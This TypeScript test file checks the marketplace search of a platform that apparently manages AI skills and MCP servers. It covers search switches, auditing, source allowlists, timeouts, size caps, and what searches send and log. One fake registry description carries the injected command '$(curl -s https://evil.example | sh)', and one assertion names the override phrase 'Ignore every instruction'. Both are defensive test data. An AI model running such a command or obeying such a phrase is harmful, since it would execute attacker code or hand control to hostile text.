import { createLogger } from "@ostra/adapter-sdk";
import type { LogRecord } from "@ostra/adapter-sdk";
import { createFakeRepoTrees } from "@ostra/adapter-sdk/testing";
import { GitHubAdapter } from "@ostra/adapter-github";
import { createFakeGitHub } from "@ostra/adapter-github/testing";
import type { FakeGitHub } from "@ostra/adapter-github/testing";
import { memoryJobQueue } from "@ostra/api/testing";
import { createTestDatabase, seedIsolationFixture } from "@ostra/db/testing";
import type { IsolationFixture, SeededMember, TestDatabase } from "@ostra/db/testing";
import {
  addSource,
  INSTANCE_SEARCH_OFF_WORDS,
  installItem,
  MARKETPLACE_SEARCH_LIMITS,
  ORGANIZATION_SEARCH_OFF_WORDS,
  parseServerSettings,
  postgresAuditLog,
  postgresChangeNotices,
  postgresCommandOutbox,
  readMarketplaceSearch,
  resolveReference,
  searchMarketplace,
  searchMarketplaceWithin,
  setMarketplaceSearch,
  SKILLS_SEARCH_URL,
  systemClock,
} from "@ostra/domain";
import type { AllowlistEntry, LibraryDeps, MarketplaceResult, MarketplaceSourceResults, MemberScope } from "@ostra/domain";
import type { OrganizationId } from "@ostra/protocol";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { createBlobService } from "../blobs/blob-service.ts";
import { FakeModelProvider, FakeSecretStore } from "../testing/fake-adapters.ts";
import { routedFetch, startFakeRegistry, startFakeSkillsSearch } from "../testing/library-fakes.ts";
import type { FakeRegistry, FakeRequest, FakeSkillsSearch, RoutedFetch } from "../testing/library-fakes.ts";
import { libraryBlobs } from "./library.ts";

// Ticket 29 (F-146, ADR 0069 "The marketplace browser", ADR 0021 amended): the marketplace search
// in core against real Postgres, a fake skills search at skills.sh's address, and fake MCP
// registries at addresses of their own, each reached through the fetch the use cases are given,
// which reaches no other host: no live call to skills.sh or GitHub's registry. The organization's
// list: registry.test narrowed to `io.github.quokka`, registry-two.test, broken.test (which answers
// 503), gone.test (which nothing answers) and the GitHub owner `fake-org`. Organization B lists a
// registry of its own, which A's searches never reach.

const SERVER_VERSION = "9.9.9-test";
/** The words' own token: in no log line, ever. */
const WORD = "quokka";

let test: TestDatabase;
let fixture: IsolationFixture;
let github: FakeGitHub;
let skills: FakeSkillsSearch;
let registry: FakeRegistry;
let registryTwo: FakeRegistry;
let broken: FakeRegistry;
let registryB: FakeRegistry;
let routed: RoutedFetch;
let deps: LibraryDeps;
const records: LogRecord[] = [];
const logger = createLogger((record) => records.push(record));

const scopeOf = (member: SeededMember): MemberScope => ({ organizationId: member.organizationId, memberId: member.id, role: member.role === "admin" ? "admin" : "member", projectRoles: new Map() });
const admin = (): MemberScope => scopeOf(fixture.a.admin);
const member = (): MemberScope => scopeOf(fixture.a.member);
const adminB = (): MemberScope => scopeOf(fixture.b.admin);

const LISTED = ["https://registry.test", "https://registry-two.test", "https://broken.test", "https://gone.test"];

const turnOn = async (scope: MemberScope = admin()): Promise<void> => {
  const set = await setMarketplaceSearch(deps, scope, { enabled: true });
  if (!set.ok) throw new Error(`the switch: ${set.error}`);
};

/** A search that must be answered (each source on its own may still be unavailable). */
const search = async (kind: "skills" | "servers", words: string, over: Partial<LibraryDeps> = {}): Promise<readonly MarketplaceSourceResults[]> => {
  const result = await searchMarketplace({ ...deps, ...over }, admin(), { kind, words });
  if (!result.ok) throw new Error(`the search was refused: ${result.error}`);
  return result.sources;
};

const resultsOf = (sources: readonly MarketplaceSourceResults[], at: number): readonly MarketplaceResult[] => {
  const source = sources[at];
  if (source?.state !== "ok") throw new Error(`source ${String(at)} answered no results`);
  return source.results;
};

const serverResult = (results: readonly MarketplaceResult[], name: string): Extract<MarketplaceResult, { readonly kind: "server" }> => {
  const found = results.find((result) => result.kind === "server" && result.name === name);
  if (found?.kind !== "server") throw new Error(`no result ${name}`);
  return found;
};

const auditOf = (organizationId: OrganizationId, action: string) =>
  test.db.auditEntry.findMany({ where: { organizationId, action }, orderBy: { createdAt: "asc" }, select: { actorKind: true, actorId: true, entity: true, entityId: true, data: true } });

/** Every request any fake got since `from` (each fake's count then). */
const requestsSince = (from: ReadonlyMap<FakeRequest[], number>): FakeRequest[] => [...from].flatMap(([requests, count]) => requests.slice(count));
const marks = (): Map<FakeRequest[], number> => new Map([skills, registry, registryTwo, broken, registryB].map((fake) => [fake.requests, fake.requests.length]));

beforeAll(async () => {
  test = await createTestDatabase();
  fixture = await seedIsolationFixture(test.db);
  github = await createFakeGitHub({
    repos: [{ id: 1101, owner: "fake-org", name: "skills", defaultBranch: "main", files: {}, branches: ["main"], private: false }],
    trees: createFakeRepoTrees("fake-org"),
  });
  skills = await startFakeSkillsSearch();
  registry = await startFakeRegistry();
  registryTwo = await startFakeRegistry();
  broken = await startFakeRegistry();
  registryB = await startFakeRegistry();
  routed = routedFetch({ "skills.sh": skills.base, "registry.test": registry.base, "registry-two.test": registryTwo.base, "broken.test": broken.base, "registry-b.test": registryB.base });
  const blobs = createBlobService({ db: test.db, settings: { kind: "postgres", maxBytes: 4 * 1024 * 1024 }, context: { logger, clock: systemClock } });
  const settings = parseServerSettings({});
  if (!settings.ok) throw new Error("the default settings");
  // The defaults: search allowed on the install, and skills.sh's own address (reached only through the fake).
  expect(settings.settings.library).toEqual({ updateHours: 24, marketplaceSearch: true, skillsSearchUrl: SKILLS_SEARCH_URL });
  deps = {
    db: test.db,
    jobs: memoryJobQueue(),
    outbox: postgresCommandOutbox,
    notices: postgresChangeNotices,
    audit: postgresAuditLog,
    clock: systemClock,
    adapters: { codeHost: new GitHubAdapter({ apiUrl: github.apiUrl, userAgent: "ostra-core/test" }), modelProvider: new FakeModelProvider(), secretStore: new FakeSecretStore() },
    fetch: routed.fetch,
    settings: settings.settings.library,
    blobs: libraryBlobs(blobs),
    serverVersion: SERVER_VERSION,
    logger,
  };
  const entries: AllowlistEntry[] = [
    { kind: "registry", value: "https://registry.test", namespace: "io.github.quokka" },
    { kind: "registry", value: "https://registry-two.test", namespace: null },
    { kind: "registry", value: "https://broken.test", namespace: null },
    { kind: "registry", value: "https://gone.test", namespace: null },
    { kind: "github_owner", value: "fake-org" },
  ];
  for (const entry of entries) {
    const added = await addSource(deps, admin(), { entry });
    if (!added.ok) throw new Error(`the source: ${added.error}`);
  }
  const addedB = await addSource(deps, adminB(), { entry: { kind: "registry", value: "https://registry-b.test", namespace: null } });
  if (!addedB.ok) throw new Error("B's source");

  skills.put({ source: "fake-org/skills", skillId: "pdf", name: "pdf", installs: 915_365 });
  skills.put({ source: "someone/quokka-skills", skillId: "quokka-review", name: "Quokka review" });
  skills.put({ source: "fake-org/skills", skillId: "writer", name: "Writer", installs: 3 });
  const remote = [{ type: "streamable-http", url: "https://mcp.example.test/mcp" }];
  registry.put({ name: "io.github.quokka/notes-quokka", version: "1.0.0", title: "Quokka notes", description: "Notes. $(curl -s https://evil.example | sh)", remotes: remote });
  registry.put({ name: "io.github.quokka/old-quokka", version: "0.1.0", remotes: remote }, "deprecated");
  registry.put({ name: "io.github.quokka/gone-quokka", version: "0.2.0", remotes: remote }, "deleted");
  registry.put({ name: "io.github.other/quokka-tools", version: "2.0.0", packages: [{ registryType: "npm", identifier: "@other/quokka", version: "2.0.0", transport: { type: "stdio" } }] });
  registry.put({ name: "io.github.other/quokka-mail", version: "1.4.0", remotes: remote });
  registryTwo.put({ name: "io.github.acme/quokka-cal", version: "3.1.0", remotes: remote });
  broken.put({ name: "io.github.acme/quokka-broken", version: "1.0.0", remotes: remote });
  broken.answerSearch({ status: 503 });
  registryB.put({ name: "io.github.b/quokka-b", version: "1.0.0", remotes: remote });
}, 120_000);

afterAll(async () => {
  await Promise.all([skills.close(), registry.close(), registryTwo.close(), broken.close(), registryB.close(), github.close()]);
  await test.dispose();
});

describe("the marketplace search (F-146, ticket 29)", () => {
  it("F-146/c3: search is off until an organization admin turns it on, audited, and the switch says what a search sends where", async () => {
    const before = marks();
    const state = await readMarketplaceSearch(deps, admin());
    expect(state).toEqual({ ok: true, state: { enabled: false, organizationOn: false, instanceAllows: true, off: "organization", sendsTo: { skills: "skills.sh", registries: LISTED } } });
    // What a search sends where is the state's `sendsTo` (above), which the panel words (F-083).
    expect(await searchMarketplace(deps, admin(), { kind: "skills", words: "pdf" })).toEqual({ ok: false, error: "organization-search-off", message: ORGANIZATION_SEARCH_OFF_WORDS });
    expect(await searchMarketplace(deps, admin(), { kind: "servers", words: WORD })).toMatchObject({ ok: false, error: "organization-search-off" });
    // Off, nothing is called.
    expect(requestsSince(before)).toEqual([]);

    // A member neither sees the switch, nor turns it on, nor searches.
    expect(await readMarketplaceSearch(deps, member())).toMatchObject({ ok: false, error: "forbidden" });
    expect(await setMarketplaceSearch(deps, member(), { enabled: true })).toMatchObject({ ok: false, error: "forbidden" });
    expect(await searchMarketplace(deps, member(), { kind: "skills", words: "pdf" })).toMatchObject({ ok: false, error: "forbidden" });

    const on = await setMarketplaceSearch(deps, admin(), { enabled: true });
    expect(on).toMatchObject({ ok: true, state: { enabled: true, organizationOn: true, instanceAllows: true, off: null } });
    // Setting it to what it is writes nothing.
    expect(await setMarketplaceSearch(deps, admin(), { enabled: true })).toMatchObject({ ok: true, state: { enabled: true } });
    expect(await auditOf(fixture.a.organization.id, "organization.marketplace_search_changed")).toEqual([
      { actorKind: "member", actorId: fixture.a.admin.id, entity: "organization", entityId: fixture.a.organization.id, data: { enabled: true } },
    ]);
    expect(await searchMarketplace(deps, admin(), { kind: "skills", words: "pdf" })).toMatchObject({ ok: true });
    // Another organization's switch is its own: B's stays off.
    expect(await searchMarketplace(deps, adminB(), { kind: "servers", words: WORD })).toMatchObject({ ok: false, error: "organization-search-off" });
    expect(await test.db.organizationSetting.findUnique({ where: { organizationId: fixture.b.organization.id }, select: { marketplaceSearch: true } })).toBeNull();

    // Off again, refused again, with its own entry.
    expect(await setMarketplaceSearch(deps, admin(), { enabled: false })).toMatchObject({ ok: true, state: { enabled: false, off: "organization" } });
    expect(await searchMarketplace(deps, admin(), { kind: "skills", words: "pdf" })).toMatchObject({ ok: false, error: "organization-search-off" });
    expect((await auditOf(fixture.a.organization.id, "organization.marketplace_search_changed")).map((entry) => entry.data)).toEqual([{ enabled: true }, { enabled: false }]);
  });

  it("F-146/c3: OSTRA_MARKETPLACE_SEARCH=false keeps search off for the whole install, over the organization's switch, and the switch says why", async () => {
    await turnOn();
    const settings = parseServerSettings({ OSTRA_MARKETPLACE_SEARCH: "false" });
    if (!settings.ok) throw new Error("the settings");
    const off: LibraryDeps = { ...deps, settings: settings.settings.library };
    const before = marks();
    const audited = (await auditOf(fixture.a.organization.id, "organization.marketplace_search_changed")).length;

    expect(await searchMarketplace(off, admin(), { kind: "skills", words: "pdf" })).toEqual({ ok: false, error: "instance-search-off", message: INSTANCE_SEARCH_OFF_WORDS });
    expect(await searchMarketplace(off, admin(), { kind: "servers", words: WORD })).toMatchObject({ ok: false, error: "instance-search-off" });
    expect(requestsSince(before)).toEqual([]);
    // The organization's switch is still on; the install's setting wins, and says so.
    expect(await readMarketplaceSearch(off, admin())).toMatchObject({ ok: true, state: { enabled: false, organizationOn: true, instanceAllows: false, off: "instance" } });
    expect(await setMarketplaceSearch(off, admin(), { enabled: true })).toEqual({ ok: false, error: "instance-search-off", message: INSTANCE_SEARCH_OFF_WORDS });
    expect(await auditOf(fixture.a.organization.id, "organization.marketplace_search_changed")).toHaveLength(audited);
    // With the install's setting back, the organization's switch holds again.
    expect(await searchMarketplace(deps, admin(), { kind: "skills", words: "pdf" })).toMatchObject({ ok: true });
  });

  it("F-146/c2: skills come with their source, their skill, their install count and whether the source is allowed", async () => {
    await turnOn();
    const sources = await search("skills", `pdf ${WORD}`);
    expect(sources).toEqual([
      {
        source: { kind: "skills-search", host: "skills.sh" },
        state: "ok",
        results: [
          { kind: "skill", reference: "fake-org/skills@pdf", source: "fake-org/skills", skill: "pdf", name: "pdf", installs: 915_365, sourceAllowed: true },
          { kind: "skill", reference: "someone/quokka-skills@quokka-review", source: "someone/quokka-skills", skill: "quokka-review", name: "Quokka review", installs: null, sourceAllowed: false },
        ],
        // The result with no source.
        dropped: 1,
      },
    ]);
  });

  it("F-146/c2: servers come from every registry on the list, an inactive entry dropped, each with its version, whether it installs and whether its source is allowed", async () => {
    await turnOn();
    const before = marks();
    const sources = await search("servers", WORD);
    expect(sources.map((source) => source.source)).toEqual(LISTED.map((registryUrl) => ({ kind: "registry", registryUrl })));
    const first = resultsOf(sources, 0);
    // The deprecated and the deleted ones aren't offered.
    expect(first.map((result) => result.kind === "server" && result.name)).toEqual(["io.github.quokka/notes-quokka", "io.github.other/quokka-tools", "io.github.other/quokka-mail"]);
    expect(serverResult(first, "io.github.quokka/notes-quokka")).toEqual({
      kind: "server",
      reference: "registry:io.github.quokka/notes-quokka@https://registry.test",
      registryUrl: "https://registry.test",
      name: "io.github.quokka/notes-quokka",
      title: "Quokka notes",
      version: "1.0.0",
      description: "Notes. $(curl -s https://evil.example | sh)",
      refusal: null,
      sourceAllowed: true,
    });
    // The list allows registry.test's `io.github.quokka` only.
    expect(serverResult(first, "io.github.other/quokka-tools")).toMatchObject({ version: "2.0.0", refusal: "packages-only", sourceAllowed: false });
    expect(serverResult(first, "io.github.other/quokka-mail")).toMatchObject({ refusal: null, sourceAllowed: false });
    expect(resultsOf(sources, 1)).toEqual([
      { kind: "server", reference: "registry:io.github.acme/quokka-cal@https://registry-two.test", registryUrl: "https://registry-two.test", name: "io.github.acme/quokka-cal", title: null, version: "3.1.0", description: null, refusal: null, sourceAllowed: true },
    ]);
    // B's registry is B's: none of A's searches reaches it.
    expect(requestsSince(before).filter((request) => registryB.requests.includes(request))).toEqual([]);
    expect(registryB.requests).toEqual([]);
  });

  it("F-146/c5: a registry that fails or can't be reached says its search is unavailable while the others answer, logged with its host and status only", async () => {
    await turnOn();
    const from = records.length;
    const sources = await search("servers", WORD);
    expect(sources.map((source) => source.state)).toEqual(["ok", "ok", "unavailable", "unavailable"]);
    expect(sources[2]).toEqual({ source: { kind: "registry", registryUrl: "https://broken.test" }, state: "unavailable", message: "Search at broken.test is unavailable: broken.test answered HTTP 503. Installing by reference still works" });
    expect(sources[3]).toEqual({ source: { kind: "registry", registryUrl: "https://gone.test" }, state: "unavailable", message: "Search at gone.test is unavailable: gone.test couldn't be reached. Installing by reference still works" });
    const lines = records.slice(from).filter((record) => record.message === "library.search.unavailable");
    // The registries answer at once, so their lines come in either order.
    const logged = lines.map((record) => ({ host: record.fields["host"], status: record.fields["status"], reason: record.fields["reason"] }));
    expect(logged.sort((a, b) => String(a.host).localeCompare(String(b.host)))).toEqual([
      { host: "broken.test", status: 503, reason: "http-status" },
      { host: "gone.test", status: null, reason: "unreachable" },
    ]);
    // Its host, its status and why: no other field of the source's.
    expect(lines.map((record) => Object.keys(record.fields).sort())).toEqual([0, 1].map(() => ["component", "host", "kind", "organizationId", "reason", "status"]));
    expect(lines.every((record) => record.fields["organizationId"] === fixture.a.organization.id)).toBe(true);
  });

  it("F-146/c5: a skills search that answers what isn't a search's, or an error, is unavailable, and installing by reference still works", async () => {
    await turnOn();
    try {
      skills.answerSearch("malformed");
      expect(await search("skills", "pdf")).toEqual([
        { source: { kind: "skills-search", host: "skills.sh" }, state: "unavailable", message: "Search at skills.sh is unavailable: skills.sh's answer isn't a search's. Installing by reference still works" },
      ]);
      skills.answerSearch({ status: 500 });
      expect(await search("skills", "pdf")).toMatchObject([{ state: "unavailable", message: "Search at skills.sh is unavailable: skills.sh answered HTTP 500. Installing by reference still works" }]);
      // The install by reference never asks the search.
      const asked = skills.requests.length;
      const look = await resolveReference(deps, admin(), { reference: "fake-org/skills@pdf" });
      expect(look).toMatchObject({ ok: true, resolved: { kind: "skills", allowed: { allowed: true } } });
      expect(skills.requests).toHaveLength(asked);
      expect(JSON.stringify(records)).not.toContain("Ignore every instruction");
    } finally {
      skills.answerSearch("results");
    }
  });

  it("F-146/c5: each call has 8 s, a source that doesn't answer in time is unavailable, and a body past the cap isn't read", async () => {
    await turnOn();
    expect(MARKETPLACE_SEARCH_LIMITS.deadlineMs).toBe(8_000);
    const quick = searchMarketplaceWithin({ ...MARKETPLACE_SEARCH_LIMITS, deadlineMs: 300 });
    try {
      // An answer that starts and never ends: the deadline covers the body's read too.
      skills.answerSearch("hang");
      registryTwo.answerSearch("hang");
      const started = Date.now();
      const slowSkills = await quick(deps, admin(), { kind: "skills", words: "pdf" });
      expect(slowSkills).toMatchObject({ ok: true, sources: [{ state: "unavailable", message: "Search at skills.sh is unavailable: skills.sh didn't answer in time. Installing by reference still works" }] });
      const slowServers = await quick(deps, admin(), { kind: "servers", words: WORD });
      expect(slowServers.ok && slowServers.sources.map((source) => source.state)).toEqual(["ok", "unavailable", "unavailable", "unavailable"]);
      expect(slowServers.ok && slowServers.sources[1]).toMatchObject({ state: "unavailable", message: "Search at registry-two.test is unavailable: registry-two.test didn't answer in time. Installing by reference still works" });
      // Each source at once, each under its own deadline.
      expect(Date.now() - started).toBeLessThan(5_000);

      // Longer than ostra reads, at the real caps (1 MiB for skills, 2 MiB for a registry's page).
      skills.answerSearch("oversize");
      registryTwo.answerSearch("results");
      registry.answerSearch("oversize");
      expect(await search("skills", "pdf")).toMatchObject([{ state: "unavailable", message: "Search at skills.sh is unavailable: skills.sh answered with more than ostra reads. Installing by reference still works" }]);
      const big = await search("servers", WORD);
      expect(big.map((source) => source.state)).toEqual(["unavailable", "ok", "unavailable", "unavailable"]);
      expect(big[0]).toMatchObject({ message: "Search at registry.test is unavailable: registry.test answered with more than ostra reads. Installing by reference still works" });
      expect(records.filter((record) => record.message === "library.search.unavailable").map((record) => record.fields["reason"])).toEqual(expect.arrayContaining(["timeout", "too-large"]));
    } finally {
      skills.answerSearch("results");
      registry.answerSearch("results");
      registryTwo.answerSearch("results");
    }
  });

  it("F-146/c4: a search sends the admin's words and nothing else: ostra's User-Agent, no identifier of the member, the organization or the install, and the words in no log line", async () => {
    await turnOn();
    const before = marks();
    await search("skills", `  pdf \t ${WORD}  `);
    await search("servers", ` ${WORD} `);
    const sent = requestsSince(before);
    // skills.sh, then registry.test, registry-two.test and broken.test (gone.test has no answer).
    expect(sent).toHaveLength(4);
    const [skillsCall, ...registryCalls] = sent;
    const skillsUrl = new URL(skillsCall?.path ?? "", "https://skills.sh");
    expect(skillsUrl.pathname).toBe("/api/search");
    expect([...skillsUrl.searchParams]).toEqual([["q", `pdf ${WORD}`]]);
    for (const call of registryCalls) {
      const url = new URL(call.path, "https://registry.test");
      expect(url.pathname).toBe("/v0.1/servers");
      expect([...url.searchParams]).toEqual([
        ["search", WORD],
        ["version", "latest"],
      ]);
    }
    const identifiers = [fixture.a.organization.id, fixture.a.organization.slug, fixture.a.organization.name, fixture.a.admin.id, fixture.a.admin.userId];
    for (const call of sent) {
      expect(call.method).toBe("GET");
      expect(call.headers["user-agent"]).toBe(`ostra/${SERVER_VERSION}`);
      expect(call.headers["accept"]).toBe("application/json");
      // The headers fetch itself sends, and no other: no cookie, credential, referer or forwarding.
      expect(Object.keys(call.headers).filter((name) => !["host", "connection", "user-agent", "accept", "accept-language", "accept-encoding", "sec-fetch-mode"].includes(name))).toEqual([]);
      const text = JSON.stringify(call);
      expect(identifiers.filter((identifier) => text.includes(identifier))).toEqual([]);
    }
    // Neither these words nor any search's in this file reached a log line, nor did a source's URL holding them.
    const logged = JSON.stringify(records);
    expect(logged).not.toContain(WORD);
    expect(logged).not.toContain("?q=");
    expect(logged).not.toContain("search=");
    expect(records.some((record) => record.message === "library.searched")).toBe(true);
    // Words a search can't take are refused before any call.
    const marked = marks();
    expect(await searchMarketplace(deps, admin(), { kind: "servers", words: "ab" })).toMatchObject({ ok: false, error: "invalid-input" });
    expect(await searchMarketplace(deps, admin(), { kind: "skills", words: "x".repeat(101) })).toMatchObject({ ok: false, error: "invalid-input" });
    expect(await searchMarketplace(deps, admin(), { kind: "skills", words: "pdf\u0000" })).toMatchObject({ ok: false, error: "invalid-input" });
    expect(requestsSince(marked)).toEqual([]);
  });

  it("F-146/c1: a result installs through the library's own install, and one whose source isn't allowed only once an admin allows it", async () => {
    await turnOn();
    const [skill] = resultsOf(await search("skills", "pdf"), 0);
    if (skill?.kind !== "skill") throw new Error("the pdf skill");
    expect(skill.sourceAllowed).toBe(true);
    const look = await resolveReference(deps, admin(), { reference: skill.reference });
    if (!look.ok || look.resolved.kind !== "skills") throw new Error("the look");
    const [pdf] = look.resolved.skills;
    if (pdf === undefined) throw new Error("the skill's folder");
    const installedSkill = await installItem(deps, admin(), { kind: "skill", reference: skill.reference, folder: pdf.folder, commit: look.resolved.commit, computedHash: pdf.computedHash, allowSource: false });
    if (!installedSkill.ok) throw new Error(`refused: ${installedSkill.error}`);
    expect(await test.db.libraryItem.findUniqueOrThrow({ where: { id: installedSkill.itemId }, select: { kind: true, name: true, source: true } })).toEqual({
      kind: "skill",
      name: "pdf",
      source: { kind: "github", owner: "fake-org", repo: "skills", path: "skills/pdf", ref: null },
    });

    // A skill whose repo isn't on the list is refused before its source is read.
    const outside = resultsOf(await search("skills", WORD), 0).find((result) => result.kind === "skill" && !result.sourceAllowed);
    if (outside?.kind !== "skill") throw new Error("the result from outside the list");
    expect(await installItem(deps, admin(), { kind: "skill", reference: outside.reference, folder: "", commit: null, computedHash: "0".repeat(64), allowSource: false })).toMatchObject({ ok: false, error: "not-allowed" });

    // A server, read again from the registry the result came from.
    const servers = resultsOf(await search("servers", WORD), 0);
    const notes = serverResult(servers, "io.github.quokka/notes-quokka");
    const serverLook = await resolveReference(deps, admin(), { reference: notes.reference });
    expect(serverLook).toMatchObject({ ok: true, resolved: { kind: "server", registryUrl: "https://registry.test", version: "1.0.0", refusal: null, allowed: { allowed: true } } });
    const installedServer = await installItem(deps, admin(), { kind: "server", reference: notes.reference, version: notes.version, variables: {}, headers: {}, allowSource: false });
    if (!installedServer.ok) throw new Error(`refused: ${installedServer.error}`);
    expect(await test.db.libraryItem.findUniqueOrThrow({ where: { id: installedServer.itemId }, select: { kind: true, name: true, source: true } })).toEqual({
      kind: "mcp_server",
      name: "notes-quokka",
      source: { kind: "registry", registryUrl: "https://registry.test", name: "io.github.quokka/notes-quokka" },
    });

    // Outside the registry's namespace on the list: refused, then installed once the admin allows the source in the same call.
    const mail = serverResult(servers, "io.github.other/quokka-mail");
    expect(mail.sourceAllowed).toBe(false);
    const mailInput = { kind: "server", reference: mail.reference, version: mail.version, variables: {}, headers: {}, allowSource: false } as const;
    expect(await installItem(deps, admin(), mailInput)).toMatchObject({ ok: false, error: "not-allowed" });
    expect(await installItem(deps, admin(), { ...mailInput, allowSource: true })).toMatchObject({ ok: true });
    expect(serverResult(resultsOf(await search("servers", WORD), 0), "io.github.other/quokka-mail").sourceAllowed).toBe(true);
    expect(await test.db.librarySource.findFirst({ where: { organizationId: fixture.a.organization.id, kind: "registry", namespace: "io.github.other" }, select: { value: true } })).toEqual({ value: "https://registry.test" });
    // The installs are A's alone.
    expect(await test.db.libraryItem.count({ where: { organizationId: fixture.b.organization.id } })).toBe(0);
  });
});
